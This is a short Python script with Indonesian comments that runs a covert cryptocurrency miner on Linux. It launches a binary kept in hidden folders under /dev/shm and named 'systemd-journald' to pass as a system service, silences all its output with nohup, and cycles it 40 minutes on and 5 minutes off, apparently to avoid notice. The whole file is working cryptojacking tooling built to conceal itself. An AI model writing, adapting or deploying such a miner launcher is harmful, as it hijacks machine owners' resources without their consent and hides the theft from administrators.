import os
import time
import sys
import signal

# CONFIG
APP_PATHS = [
    "/dev/shm/.store/1/systemd-journald",
    "/dev/shm/.store/2/systemd-journald"
]
APP_NAME = "systemd-journald"
RUNTIME = 2400  # 40 menit
BREAKTIME = 300  # 5 menit

def stop_app():
    """Hentikan layanan tersembunyi."""
    os.system(f"pkill -f {APP_NAME}")
    print("🛑 Semua layanan dihentikan...")

def start_app(path):
    """Jalankan layanan tersembunyi pakai nohup."""
    print(f"▶️ Menjalankan layanan dari {path}...")
    miner_dir = os.path.dirname(path)
    command = f"cd {miner_dir} && nohup {path} > /dev/null 2>&1 &"
    os.system(command)
    print(f"✅ Layanan jalan di folder {miner_dir}")
    time.sleep(5)

def main():
    index = 0
    while True:
        path = APP_PATHS[index]
        print(f"⚙️ Mulai jalanin: {path}")
        start_app(path)
        time.sleep(RUNTIME)
        stop_app()
        print(f"⏸️ Istirahat {BREAKTIME // 60} menit...")
        time.sleep(BREAKTIME)
        
        # Ganti ke path berikutnya
        index = (index + 1) % len(APP_PATHS)

def sigint_handler(sig, frame):
    """Kalau dihentikan manual, hentikan semua."""
    print("📴 Stop manual diterima...")
    stop_app()
    sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)

if __name__ == "__main__":
    print("☁️ Menyiapkan mesin panen kesayangan...")
    main()
